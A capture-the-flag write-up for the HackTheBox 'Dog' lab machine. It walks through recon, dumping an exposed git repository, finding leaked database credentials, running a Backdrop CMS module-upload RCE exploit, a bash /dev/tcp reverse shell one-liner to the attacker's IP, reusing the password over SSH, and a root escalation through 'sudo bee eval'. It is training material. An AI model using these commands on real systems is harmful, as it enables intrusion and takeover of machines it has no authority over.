# Dog - Easy

Target IP: **10.129.63.146**

## User Flag

Initial scan: ```sudo nmap -sC -sV 10.129.63.146 -v```

Output shows standard port 22 for ssh, and port 80 for http. Port 80 shows some interesting results. A website is being hosted on Apache 2.4.41, a git repository is detected, and ```robots.txt``` contains a lot of entries that might be worth to check out.

Particularly interesting is ```README.md```, ```/admin```, ```/web.config```, and ```/user/login```.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-git: 
|   10.129.63.146:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's pay ```http://10.129.63.146``` a visit.

We see the home page along with a button to go to the login page. Additionally, we see that the website is powered by Backdrop CMS. 

![1](Screenshots/Dog_1.jpg)

![2](Screenshots/Dog_2.jpg)

```/README.md``` includes the documentation for Backdrop.

![3](Screenshots/Dog_3.jpg)

Let's send a dummy request by filling in the login form and capture it on Burp. While looking at the response to the dummy request, I found something interesting. The website seemed to be loading javascript scripts from a ```/files/``` directory.

![4](Screenshots/Dog_4.jpg)

Let's navigate to it.

We see that the ```/files/``` directory has directory listing enabled.

![5](Screenshots/Dog_5.jpg)

What seems the most interesting here is the ```/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active``` directory, where we find ```.json``` configuration files for the Backdrop CMS instance.

![6](Screenshots/Dog_6.jpg)

Digging through the files, we come across a potential user we can log in as.

![7](Screenshots/Dog_7.jpg)

My objective now is discovering a password for ```tiffany@dog.htb```.

I looked around the configuration folder but could not find anything particularly useful.

Moving on to the aforementioned ```/.git/``` directory, we see that it also has directory listing enabled.

![8](Screenshots/Dog_8.jpg)

Let's dump the exposed ```.git``` endpoint by reconstructing the repo: ```git-dumper http://10.129.63.146/.git/ dump```

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~]
└──╼ [★]$ cd dump
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~/dump]
└──╼ [★]$ ls
core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~/dump]
└──╼ [★]$
```

Inside ```settings.php```, we see credentials.

```$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';```

Let's try logging in with these credentials.

Logging in with ```root``` didn't work, but using our previously discovered email ```tiffany@dog.htb``` works, and we are navigated to the admin panel.

![9](Screenshots/Dog_9.jpg)

Digging around the website, we find that we are able to upload zipped files to install new modules. This seems like a vulnerability. If we can package a php reverse shell and upload it, the server might execute it and give us a connection back.

![10](Screenshots/Dog_10.jpg)

Let's try it. We first get our reverse shell and package it along a dummy ```.txt``` file to a ```.tar``` file.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~]
└──╼ [★]$ tar -cvf hi.tar php-reverse-shell.php hi.txt
php-reverse-shell.php
hi.txt
```

Uploading the ```.tar``` file, we get an error saying that the ```.tar``` file doesn't contain any ```.info``` files. 

![11](Screenshots/Dog_11.jpg)

Let's create a dummy ```.info``` file and place it in the ```.tar``` file and try again.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~]
└──╼ [★]$ tar -cvf hi.tar php-reverse-shell.php hi.txt hi.info
php-reverse-shell.php
hi.txt
hi.info
```

After doing so, I still had the error. After a Google search, I found out that the entire directory named after the module name had to be packaged. Let's try that.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~]
└──╼ [★]$ mkdir hi
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~]
└──╼ [★]$ mv hi.txt php-reverse-shell.php hi.info hi
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~]
└──╼ [★]$ ls hi
hi.info  hi.txt  php-reverse-shell.php
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~]
└──╼ [★]$ tar -cvf hi.tar hi
hi/
hi/php-reverse-shell.php
hi/hi.info
hi/hi.txt
```

We get another error. Hmm...

![11](Screenshots/Dog_11.jpg)

Let's look for a PoC online. Pretty quickly we find this [script](https://github.com/rvzsec/backdrop-rce/blob/main/exploit.py), which we should try to use.

Let's try it.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-gmuvorbcom]─[~/backdrop-rce]
└──╼ [★]$ python3 exploit.py http://10.129.63.146/ tiffany@dog.htb BackDropJ2024DS2024
[>] logging in as user: 'tiffany@dog.htb'
[>] login successful
[>] enabling maintenance mode
[>] maintenance enabled
[>] payload archive: /tmp/bd_izkazi82/rvz25fa30.tgz
[>] fetching installer form
[>] uploading payload (bulk empty)
[>] initial upload post complete
[>] batch id = 12; sending authorize ‘do_nojs’ and ‘do’
[>] waiting for shell at: http://10.129.63.146/modules/rvz25fa30/shell.php
[>] shell is live
[>] interactive shell – type 'exit' to quit
root@10.129.63.146 > whoami
www-data
```

We get a shell as ```www-data```. The shell through the exploit was a bit unstable, so I ran ```bash -c "bash -i >& /dev/tcp/10.10.15.194/4444 0>&1"``` to initiate a reverse shell connection to a netcat listener.

Looking inside the ```/home``` directory, we see two users: ```jobert``` and ```johncusack```.

```
www-data@dog:/home$ ls
ls
jobert
johncusack
```

Let's first try logging in with the same password we discovered for the ```tiffany``` user. Since the credentials were for a database, if the other users are treated as an admin as well, they might be reusing the same password.

We get access to the ```johncusack``` user by logging in through ssh.

```
johncusack@dog:~$ whoami
johncusack
```

We can proceed to get the user flag from here.

## Root Flag

Checking ```sudo -l```, we find out that we can run ```/usr/local/bin/bee``` as ```root```.

```
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Looking on GTFOBins, it tells us that the ```bee``` binary can run php code. We can try to spawn in a shell as ```root``` using this vulnerability.

```
johncusack@dog:/var/www/html$ sudo bee eval 'system("/bin/bash");'
root@dog:/var/www/html# whoami
root
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
